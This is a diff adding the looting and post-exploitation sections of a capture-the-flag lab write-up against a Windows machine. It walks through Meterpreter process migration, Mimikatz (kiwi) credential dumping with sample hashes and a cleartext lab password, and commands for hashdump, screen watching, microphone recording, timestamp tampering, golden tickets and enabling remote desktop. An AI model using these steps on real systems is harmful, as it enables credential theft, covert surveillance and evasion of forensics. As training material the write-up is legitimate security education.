@@ -401,7 +401,124 @@ Now that we have an exploit in mind for elevating our privileges, let's backgrou
 => SeTakeOwnershipPrivilege
 
 ### Task 5 : Looting
+  
+Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't). 
+  
+In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it!
+  
+#### 1) What's the name of the printer service ?
+  
+  spoolsv.exe 
+ 
+  #### 2) Migrate to this process now with the command `migrate -N PROCESS_NAME`.
+  
+`meterpreter > migrate -N spoolsv.exe`
+  
+> [*] Migrating from 1964 to 1376...
+> 
+> [*] Migration completed successfully.
+  
+#### 3) Let's check what user we are now with the command `getuid`. What user is listed ?
+
+  `meterpreter > getuid`
+
+  > Server username: NT AUTHORITY\SYSTEM
+  
+Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz).
+  
+`meterpreter > load kiwi`
+  
+#### Which command allows up to retrieve all credentials ?  
+  
+`meterpreter > help`  
+
+=> creds_all
+  
+####   Run this command now. What is Dark's password ?
+  
+`meterpreter > creds_all`
+
+> [+] Running as SYSTEM
+>   
+> [*] Retrieving all credentials
+>   
+> msv credentials
+>   
+> ===============
+>   
+> Username  Domain   LM                                NTLM                              SHA1
+>   
+> --------  ------   --                                ----                              ----
+>   
+> Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb
+> 
+> wdigest credentials
+>   
+> ===================
+> 
+> Username  Domain     Password
+>   
+> --------  ------     --------
+>   
+> (null)    (null)     (null)
+>   
+> DARK-PC$  WORKGROUP  (null)
+>   
+> Dark      Dark-PC    **Password01!**
+>   
+> tspkg credentials
+> 
+> =================
+>   
+> Username  Domain   Password
+>  
+> --------  ------   --------
+>   
+> Dark      Dark-PC  **Password01!**
+> 
+> kerberos credentials
+> 
+> ====================
+>   
+> Username  Domain     Password
+> 
+> --------  ------     --------
+>   
+> (null)    (null)     (null)
+>   
+> Dark      Dark-PC    **Password01!**
+>  
+> dark-pc$  WORKGROUP  (null)  
 
 ### Task 6 : Post-exploitation
+  
+  #### What command allows us to dump all of the password hashes stored on the system ?
+  
+  `hashdump`
+  
+  #### While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time ?
+  
+  `screenshare`
+  
+  #### How about if we wanted to record from a microphone attached to the system ?
+  
+  `record_mic`
+  
+  #### To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this ?
+  
+  `timestomp`
+  
+ Mimikatz allows us to create what's called a "golden ticket", allowing us to authenticate anywhere with ease. 
+  
+Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.
+  
+  #### What command allows us to do this ?
+  
+  `golden_ticket_create`
+  
+One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`.  
 
 ### Task 7 : Extra credit
+  
+Not completed yet.
+  
